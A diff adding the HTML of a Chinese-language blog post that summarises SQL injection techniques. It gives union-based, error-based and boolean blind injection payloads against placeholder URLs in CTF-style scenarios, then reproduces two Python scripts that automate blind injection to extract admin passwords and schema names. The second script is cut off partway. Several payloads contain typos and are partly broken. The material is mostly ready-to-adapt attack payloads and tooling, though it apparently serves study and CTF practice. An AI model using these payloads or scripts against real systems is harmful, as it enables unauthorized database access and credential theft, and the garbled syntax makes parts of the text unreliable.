@@ -1,0 +1,403 @@
+<!doctype html><html itemscope itemtype=http://schema.org/WebPage lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=2"><meta name=robots content="noodp"><title>SQL注入小结 - Ghostasky's Blog</title><meta name=author content>
+<meta name=author-link content><meta name=description content><meta name=keywords content='WEB'><meta itemprop=name content="SQL注入小结"><meta itemprop=description content><meta itemprop=datePublished content="2020-11-19T09:11:07+00:00"><meta itemprop=dateModified content="2020-11-19T09:11:07+00:00"><meta itemprop=wordCount content="3539"><meta itemprop=keywords content="WEB,"><meta property="og:title" content="SQL注入小结"><meta property="og:description" content><meta property="og:type" content="article"><meta property="og:url" content="http://ghostasky.github.io/posts/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-11-19T09:11:07+00:00"><meta property="article:modified_time" content="2020-11-19T09:11:07+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="SQL注入小结"><meta name=twitter:description content><meta name=application-name content="FixIt"><meta name=apple-mobile-web-app-title content="FixIt"><meta name=theme-color data-light=#f8f8f8 data-dark=#252627 content="#f8f8f8"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=canonical href=http://ghostasky.github.io/posts/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/><link rel=prev href=http://ghostasky.github.io/about/><link rel=next href=http://ghostasky.github.io/posts/python__re%E6%A8%A1%E5%9D%97%E4%B8%8E%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=/lib/fontawesome-free/all.min.css as=style onload='this.removeAttribute("onload"),this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload href=/lib/animate/animate.min.css as=style onload='this.removeAttribute("onload"),this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"SQL注入小结","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"http:\/\/ghostasky.github.io\/posts\/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93\/"},"genre":"posts","keywords":"WEB","wordcount":3539,"url":"http:\/\/ghostasky.github.io\/posts\/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93\/","datePublished":"2020-11-19T09:11:07+00:00","dateModified":"2020-11-19T09:11:07+00:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"作者"},"description":""}</script></head><body data-header-desktop=sticky data-header-mobile=auto><script>(window.localStorage?.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("data-theme","dark")</script><div class=wrapper data-page-style=normal><header class="desktop animate__faster" id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="Ghostasky's Blog"><img loading=lazy src=/images/fixit.png alt="Ghostasky's Blog" data-title="Ghostasky's Blog" class=logo style="background:url(/images/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title;for(const e of["style","data-title","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title;for(const e of["style","data-title","onerror","onload"])this.removeAttribute(e)'><span class=header-title-text>Ghostasky's Blog</span></a><span class=header-subtitle></span></div><nav><ul class=menu><li class=menu-item><a class=menu-link href=/posts/>文章</a></li><li class=menu-item><a class=menu-link href=/categories/>分类</a></li><li class=menu-item><a class=menu-link href=/tags/>标签</a></li><li class=menu-item><a class=menu-link href=/about/>关于</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title=切换主题><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></li></ul></nav></div></header><header class="mobile animate__faster" id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="Ghostasky's Blog"><img loading=lazy src=/images/fixit.png alt=/images/fixit.png data-title=/images/fixit.png class=logo style="background:url(/images/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title;for(const e of["style","data-title","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title;for(const e of["style","data-title","onerror","onload"])this.removeAttribute(e)'><span class=header-title-text>Ghostasky's Blog</span></a><span class=header-subtitle></span></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><nav><ul class=menu id=menu-mobile><li class=menu-item><a class=menu-link href=/posts/>文章</a></li><li class=menu-item><a class=menu-link href=/categories/>分类</a></li><li class=menu-item><a class=menu-link href=/tags/>标签</a></li><li class=menu-item><a class=menu-link href=/about/>关于</a></li><li class="menu-item menu-system"><span class="menu-system-item theme-switch" title=切换主题><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></span></li></ul></nav></div></header><main class=container><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label=合集></aside><article class="page single"><div class=header><h1 class="single-title animate__animated animate__flipInX"><span>SQL注入小结</span></h1></div><div class=post-meta><div class=post-meta-line><span class=post-author><span class=author><i class="fa-solid fa-user-circle" aria-hidden=true></i>
+Anonymous</span></span><span class=post-included-in>&nbsp;收录于 <a href=/categories/technology/ class=post-category title="分类 - Technology"><i class="fa-regular fa-folder fa-fw" aria-hidden=true></i> Technology</a></span></div><div class=post-meta-line><span title="发布于 2020-11-19 09:11:07"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden=true></i><time datetime=2020-11-19>2020-11-19</time></span>&nbsp;<span title="3539 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden=true></i>约 3600 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden=true></i>预计阅读 8 分钟</span>&nbsp;</div></div><div class="details toc" id=toc-static data-kept=false><div class="details-summary toc-title"><span>目录</span>
+<span><i class="details-icon fa-solid fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#1联合查询注入>1.联合查询注入：</a></li><li><a href=#2报错注入>2.报错注入</a></li><li><a href=#3盲注>3.盲注</a><ul><li></li></ul></li><li><a href=#下面是两个盲注的脚本来自网络>下面是两个盲注的脚本(来自网络)</a></li></ul></nav></div></div><div class=content id=content><p>[TOC]</p><hr><h2 id=1联合查询注入 class=heading-element><a href=#1%e8%81%94%e5%90%88%e6%9f%a5%e8%af%a2%e6%b3%a8%e5%85%a5 class=heading-mark></a>1.联合查询注入：</h2><pre tabindex=0><code>http://xxxx.xx/?id=1&#39;</code></pre><pre tabindex=0><code>http://xxxx.xx/?id=1&#39; order by 4#
+	union前后的字段数要一致，所以要order by</code></pre><pre tabindex=0><code>http://xxxx.xx/?id=1&#39; union 1,2,3,database()#
+​		假设当前数据库:bugku
+​		user():
+​		database():
+​		table_schema:库名
+​		table_name:表名
+​		column_name:列名</code></pre><pre tabindex=0><code>先介绍几个函数：
+
+一 concat()函数
+
+1、功能：将多个字符串连接成一个字符串。
+
+2、语法：concat(str1, str2,...)　　
+
+返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。
+
+3、语法：concat(str1, seperator,str2,seperator,...)
+
+返回结果为连接参数产生的字符串并且有分隔符，如果有任何一个参数为null，则返回值为null。
+
+
+二 concat_ws()函数
+
+1、功能：和concat()一样，将多个字符串连接成一个字符串，但是可以一次性指定分隔符（concat_ws就是concat with separator）
+
+2、语法：concat_ws(separator, str1, str2, ...)
+
+说明：第一个参数指定分隔符。需要注意的是分隔符不能为null，如果为null，则返回结果为null。
+
+
+三 group_concat()函数
+
+1、功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。
+
+2、语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc  ] [separator &#39;分隔符&#39;] )
+
+说明：通过使用distinct可以排除重复值；如果希望对结果中的值进行排序，可以使用order by子句；separator是一个字符串值，缺省为一个逗号。</code></pre><pre tabindex=0><code>http://xxxx.xx/?id=1&#39; union select 1,2,3,group_concat(schema_name) from information_schema.schemata#
+
+                  列出所有数据库
+​		MySQL5.0之后提供information.schema表
+​		information_schema.schemata：所有数据库的基本信息，show databases()的结果取自于该表
+​		information_schema.tables：所有表
+​		information_schema.columns：所有列信息
+​		group_concat():连接一个组的所有字符串，并以逗号隔开
+​		concat():连接一个或多个字符串
+​		concat_ws(p1,p2):第一个参数是分隔符(&#39;~&#39;)(&#39;,&#39;),第二个参数嗯。。</code></pre><pre tabindex=0><code>http://xxxx.xx/?id=1&#39; union select 1,2,3,group_concat(table_name) from information_schema.tables where schema_name=&#39;flagku&#39;#
+http://xxxx.xx/?id=1&#39; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=&#39;flagku&#39;#
+两个都试一下
+
+​		列出flagku库中所有表名
+​		假设有flagtable表</code></pre><pre tabindex=0><code>http://xxxx.xx/?id=1&#39; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&#39;flagtable&#39;#
+
+​		flagku.flagtable中所有的字段
+​		假设有id，pwd</code></pre><pre tabindex=0><code>http://xxxx.xx/?id=1&#39; union select 1,2,3,group_concat(id,&#39;-&#39;,pwd) from flagku.flagtable#
+http://xxxx.xx/?id=1&#39; union select 1,2,3,group_concat(concat_ws(&#39;~&#39;,id,pwd)) from flagku.flagtable#
+​		爆出id,pwd</code></pre><h2 id=2报错注入 class=heading-element><a href=#2%e6%8a%a5%e9%94%99%e6%b3%a8%e5%85%a5 class=heading-mark></a>2.报错注入</h2><p>​ 首先提供两个函数：
+​ extractvalue() 和 updatexml()</p><pre tabindex=0><code>http://xxxx.xx/?id=1&#39; and updataexml(1,concat(&#39;~&#39;,select schema_name from information_schema.schemata limit 0,1),1)
+​		获取数据库名</code></pre><pre tabindex=0><code>http://xxxx.xx/?id=1&#39; and updataexml(1,concat(&#39;~&#39;,select table_name from information_schema.tables where table_schema=&#39;flagku&#39; limit 0,1),1)
+​		flagku的表名</code></pre><pre tabindex=0><code>http://xxxx.xx/?id=1&#39; and updataexml(1,concat(&#39;~&#39;,select column_name from information_schema.columns where colume_schema=&#39;flagtable&#39; limit 0,1),1)
+​		flagku.flagtable的字段名</code></pre><pre tabindex=0><code>http://xxxx.xx/?id=1&#39; and updataexml(1,concat(&#39;~&#39;,select group_concat(id,&#39;-&#39;,pwd) from flagku.flagtable),1)
+​		爆id,pwd</code></pre><p>可以引入substr( )函数和ascii( )函数进行单个字符的比较以及ASCII码的判断</p><pre tabindex=0><code>L3m0n	sql注入笔记
+联合查询注入：
+
+	union select 1,2,3,table_name from information_schema.tables where table_schema=&#39;dvwa&#39;
+		得到dvwa库的表，假设有user和guest
+
+
+	union select 1,2,3,column_name from information_schema.columns where table_name=&#39;user&#39;
+		得到user表的字段，假设有id，pwd
+
+	union select 1,2,id,pwd from dwva.user
+		爆库
+
+	经常用到的函数：group_concat(),,,concat()
+
+	union select 1,2,group_concat(distinct table_schema) from information_schema.tables
+
+报错注入：
+	先提供两个函数：
+		extractvalue()和updatexml()
+
+	admin&#39; or updatexml(1,concat(&#39;$&#39;,database(),1))#
+		假设得到数据库名字geek
+
+	admin&#39; or updatexml(1,concat(&#39;$&#39;,select group_concat(table_name) from information_schema.tables where table_schema=&#39;geek&#39;),1)
+		得到表名：geekuser
+
+	admin&#39; or updatexml(1,concat(&#39;$&#39;,select group_concat(column_name) from information_schema.colunms where table_name=&#39;geekuser&#39;,1)
+		得到字段：id，pwd
+
+	admin&#39; or upatexml(1,concat(&#39;$&#39;,select concat(id,pwd)from geek.geekuser where id=1)</code></pre><h2 id=3盲注 class=heading-element><a href=#3%e7%9b%b2%e6%b3%a8 class=heading-mark></a>3.盲注</h2><pre tabindex=0><code>	length()：返回字符串的长度
+	mid(str,pos,num)  :截取指定位置指定长度的字符串
+	ascii():查询ascii码中对应的值
+	left(string, n)：得到字符串string左边n个字符
+	right(string, n)：得到字符串string右边n个字符
+	substr(), substring(), mid()函数实现的功能是一样的, 均为截取字符串, 而且用法相同
+		第一个参数是想要截取的字符串，第二个参数是起始位置，第三个是要截取的长度
+	if(cs1,cs2,cs3):C语言的三目运算符cs1?cs2:cs3相同
+	count():用来统计表的行数，也就是统计记录行数</code></pre><h4 id=猜数据库名 class=heading-element><a href=#%e7%8c%9c%e6%95%b0%e6%8d%ae%e5%ba%93%e5%90%8d class=heading-mark></a>猜数据库名：</h4><pre tabindex=0><code>1 &#39;and (length(database()))&gt;3#
+		之后一直判断，假设数据库长度是4
+1&#39; and ascii(substr(database(),1,1))=119#    w
+1&#39; and ascii(substr(database(),2,1))=101#    e
+1&#39; and ascii(substr(database(),3,1))=98#    b
+1&#39; and ascii(substr(database(),4,1))=49#    1
+猜测表的个数
+	1&#39; and (select count(table_name) from infotmation_schema.tables where table_schema=databases())=2#</code></pre><h4 id=猜表名 class=heading-element><a href=#%e7%8c%9c%e8%a1%a8%e5%90%8d class=heading-mark></a>猜表名</h4><pre tabindex=0><code>第一个表：
+		1&#39; and length(select table_name from information_schema.tables where table_schema=database() limit 0,1)=4#
+			第一个表名长度为4
+		1&#39; and ascii(substr(select table_name from information_schema.tables where table_schema=databases() limit 0,1)1,1)=102#   f
+		1&#39; and ascii(substr(select table_name from information_schema.tables where table_schema=databases() limit 0,1)2,1)=108#   l
+		1&#39; and ascii(substr(select table_name from information_schema.tables where table_schema=databases() limit 0,1)3,1)=97#    a
+		1&#39; and ascii(substr(select table_name from information_schema.tables where table_schema=databases() limit 0,1)4,1)=103#   g</code></pre><pre tabindex=0><code>第二个表
+	1&#39; and length(select table_name from information_schema.tables where table_schema=database() limit 1,1)=5#
+		第一个表名长度为4
+	1&#39; and ascii(substr(select table_name from information_schema.tables where table_schema=databases() limit 0,1)1,1)=102#   f
+	1&#39; and ascii(substr(select table_name from information_schema.tables where table_schema=databases() limit 0,1)2,1)=108#   l
+	1&#39; and ascii(substr(select table_name from information_schema.tables where table_schema=databases() limit 0,1)3,1)=97#    a
+	1&#39; and ascii(substr(select table_name from information_schema.tables where table_schema=databases() limit 0,1)4,1)=103#   g
+	1&#39; and ascii(substr(select table_name from information_schema.tables where table_schema=databases() limit 0,1)4,1)=103#   g</code></pre><h4 id=猜列名 class=heading-element><a href=#%e7%8c%9c%e5%88%97%e5%90%8d class=heading-mark></a>猜列名：</h4><pre tabindex=0><code>	第一个表列名长度：
+		1&#39; and length(select column_name from information_schema.columns where table_scheme=databases() and table_name=&#39;flag&#39; limit 1)=4#
+			假设列表名长度为4
+		1&#39; and ascii(substr(select column_name from information_schema.columns where table_schema=databases() and table_name=&#39;flag&#39; limit1)1,1)=102#   f
+		1&#39; and ascii(substr(select column_name from information_schema.columns where table_schema=databases() and table_name=&#39;flag&#39; limit1)2,1)=108#   a
+		1&#39; and ascii(substr(select column_name from information_schema.columns where table_schema=databases() and table_name=&#39;flag&#39; limit1)3,1)=97#    l
+		1&#39; and ascii(substr(select column_name from information_schema.columns where table_schema=databases() and table_name=&#39;flag&#39; limit1)4,1)=103#   g</code></pre><h4 id=猜数据 class=heading-element><a href=#%e7%8c%9c%e6%95%b0%e6%8d%ae class=heading-mark></a>猜数据：</h4><pre tabindex=0><code>	1&#39; and (select count(*) from flag)=1#
+		有一行数据
+	1&#39; and length(select flag from flag limit 1)=26  
+		数据长度是26
+	1&#39; and ascii(substr(select flag from flag limit 1)1,1)=102#
+		第一个字符为f，之后burp跑就oj8k.</code></pre><h2 id=下面是两个盲注的脚本来自网络 class=heading-element><a href=#%e4%b8%8b%e9%9d%a2%e6%98%af%e4%b8%a4%e4%b8%aa%e7%9b%b2%e6%b3%a8%e7%9a%84%e8%84%9a%e6%9c%ac%e6%9d%a5%e8%87%aa%e7%bd%91%e7%bb%9c class=heading-mark></a>下面是两个盲注的脚本(来自网络)</h2><div class=highlight id=id-20><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>##coding=utf-8</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>login</span><span class=p>(</span><span class=n>_username</span><span class=p>,</span><span class=n>_password</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=c1>#需要改动处</span>
+</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://xxxxx.xx/login.php&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;username&#34;</span><span class=p>:</span><span class=n>_username</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=n>_password</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>=</span> <span class=n>response</span><span class=o>.</span><span class=n>content</span>
+</span></span><span class=line><span class=cl>    <span class=c1>#print content</span>
+</span></span><span class=line><span class=cl>    <span class=c1>#这里是判断盲注的单个字符是否正确的条件，一般这个脚本模板在使用之前要修改此处</span>
+</span></span><span class=line><span class=cl>    <span class=c1>#此题是因为注入username字段，当payload后面的语句正确的时候，返回的是密码错误，如果错误返回用户名错误</span>
+</span></span><span class=line><span class=cl>    <span class=c1>#payload=_username = &#34;amin&#39; or (((asCIi(sUBsTring((sELect/**/passWord/**/From/**/admin/**/where/**/username=&#39;admin&#39;),%d,1)))=%d))#&#34; %(i,j)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;密码错误&#34;</span> <span class=ow>in</span> <span class=n>content</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>True</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>find_name</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=c1># i 表示了所要查找的名字的最大长度</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x50</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=c1># 0x80=128 , 0x20=32,  32-128为可显示的字符的区间</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x80</span> <span class=p>,</span> <span class=mh>0x20</span> <span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=c1>#mysql 官方注释  &#34;-- &#34; --后面有空格,或者用 &#34;#&#34;</span>
+</span></span><span class=line><span class=cl>            <span class=c1>#_username = &#34;amin&#39; or (((asCIi(sUBsTring((sELect/**/gROup_conCAt(sCHEma_name)/**/From/**/inFormation_SChema.scHemata),%d,1)))=%d))#&#34; %(i,j)    #此处是payload,需要改动</span>
+</span></span><span class=line><span class=cl>            <span class=c1>#_username = &#34;amin&#39; or (((asCIi(sUBsTring((sELect/**/sCHEma_name/**/From/**/inFormation_SChema.scHemata/**/Limit/**/3,1),%d,1)))=%d))#&#34; %(i,j)</span>
+</span></span><span class=line><span class=cl>            <span class=c1>#_username = &#34;amin&#39; or (((asCIi(sUBsTring((sELect/**/group_concat(Table_name)/**/From/**/inFormation_SChema.tAbles/**/where/**/taBle_schema=&#39;sql1&#39;),%d,1)))=%d))#&#34; %(i,j)</span>
+</span></span><span class=line><span class=cl>            <span class=c1>#_username = &#34;amin&#39; or (((asCIi(sUBsTring((sELect/**/group_concat(columN_name)/**/From/**/inFormation_SChema.columns/**/where/**/taBle_naMe=&#39;admin&#39;),%d,1)))=%d))#&#34; %(i,j)</span>
+</span></span><span class=line><span class=cl>            <span class=n>_username</span> <span class=o>=</span> <span class=s2>&#34;amin&#39; or (((asCIi(sUBsTring((sELect/**/passWord/**/From/**/admin/**/where/**/username=&#39;admin&#39;),</span><span class=si>%d</span><span class=s2>,1)))=</span><span class=si>%d</span><span class=s2>))#&#34;</span> <span class=o>%</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=n>j</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=c1>#_username = &#34;amin&#39; or (ASCII(sUBsTring((user()),%d,1)=%d )) --&#34; %(i,j)</span>
+</span></span><span class=line><span class=cl>            <span class=c1>#_username = &#34;amin&#39;or(((asCIi(sUBString((sELEct/**/group_concat(scheMA_Name)/**/FRom/**/inforMATion_scheMa.schemaTa),%d,1)))=%d))-- &#34; % (i, j)</span>
+</span></span><span class=line><span class=cl>            <span class=c1>#可改动处</span>
+</span></span><span class=line><span class=cl>            <span class=n>_password</span><span class=o>=</span><span class=s2>&#34;amin&#34;</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span> <span class=n>_username</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>login</span><span class=p>(</span><span class=n>_username</span><span class=p>,</span><span class=n>_password</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>                <span class=n>find_name</span><span class=o>+=</span><span class=nb>chr</span><span class=p>(</span><span class=n>j</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                <span class=nb>print</span> <span class=n>find_name</span>
+</span></span><span class=line><span class=cl>                <span class=k>break</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>main</span><span class=p>()</span></span></span></code></pre></div><div class=highlight id=id-21><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>## 1.布尔盲注</span>
+</span></span><span class=line><span class=cl><span class=c1>## 页面有不同的响应word1,word2</span>
+</span></span><span class=line><span class=cl><span class=c1>## 可猜解数据库长度、个数、名字、表个数、表长度、名字、字段、</span>
+</span></span><span class=line><span class=cl><span class=c1>## 长度:length，order by</span>
+</span></span><span class=line><span class=cl><span class=c1>## 个数:count</span>
+</span></span><span class=line><span class=cl><span class=c1>## 名字：ascii，substr</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>math</span> <span class=kn>import</span> <span class=n>ceil</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>SqlInject</span><span class=p>(</span><span class=nb>object</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>headers</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;headers&#34;</span><span class=p>:</span><span class=s2>&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=n>data</span><span class=o>=</span> <span class=p>{}</span>
+</span></span><span class=line><span class=cl>    <span class=nd>@classmethod</span>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>judge</span><span class=p>(</span><span class=bp>cls</span><span class=p>,</span><span class=n>url</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>bool</span><span class=p>(</span><span class=n>SqlInject</span><span class=o>.</span><span class=n>data</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=n>result</span> <span class=o>=</span> <span class=kc>None</span>
+</span></span><span class=line><span class=cl>            <span class=c1># print(result)</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>result</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=p>,</span><span class=n>headers</span><span class=o>=</span><span class=n>SqlInject</span><span class=o>.</span><span class=n>headers</span><span class=p>,</span><span class=n>timeout</span><span class=o>=</span><span class=mi>5</span><span class=p>)</span><span class=o>.</span><span class=n>text</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>result</span>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span><span class=n>url</span><span class=p>,</span><span class=n>word1</span><span class=p>,</span><span class=n>word2</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>url</span> <span class=o>=</span> <span class=n>url</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>word1</span><span class=o>=</span><span class=n>word1</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>word2</span><span class=o>=</span><span class=n>word2</span>
+</span></span><span class=line><span class=cl>    <span class=c1>#word1 in result we think you get result</span>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>get_Current_Db_Len</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>20</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;?id=1%27+and+(length(database())=</span><span class=si>{}</span><span class=s2>)--+&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>final_payload</span><span class=o>=</span><span class=bp>self</span><span class=o>.</span><span class=n>url</span><span class=o>+</span><span class=n>payload</span>
+</span></span><span class=line><span class=cl>            <span class=n>result</span> <span class=o>=</span> <span class=n>SqlInject</span><span class=o>.</span><span class=n>judge</span><span class=p>(</span><span class=n>final_payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>word1</span> <span class=ow>in</span> <span class=n>result</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;database len:&#34;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>+</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>i</span>
+</span></span><span class=line><span class=cl>    <span class=c1>#information db the number db</span>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>get_All_Db_Len</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span><span class=n>Db_number</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>20</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;?id=1%27+and+(select+((select+length(concat(schema_name))+from+information_schema.schemata+limit+</span><span class=si>{}</span><span class=s2>,1)=</span><span class=si>{}</span><span class=s2>))--+&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>Db_number</span><span class=p>,</span><span class=n>i</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>final_payload</span><span class=o>=</span><span class=bp>self</span><span class=o>.</span><span class=n>url</span><span class=o>+</span><span class=n>payload</span>
+</span></span><span class=line><span class=cl>            <span class=n>result</span> <span class=o>=</span> <span class=n>SqlInject</span><span class=o>.</span><span class=n>judge</span><span class=p>(</span><span class=n>final_payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>word1</span> <span class=ow>in</span> <span class=n>result</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Database_len:&#34;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>+</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>i</span>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>get_All_Db_Number</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>20</span><span class=p>):</span>
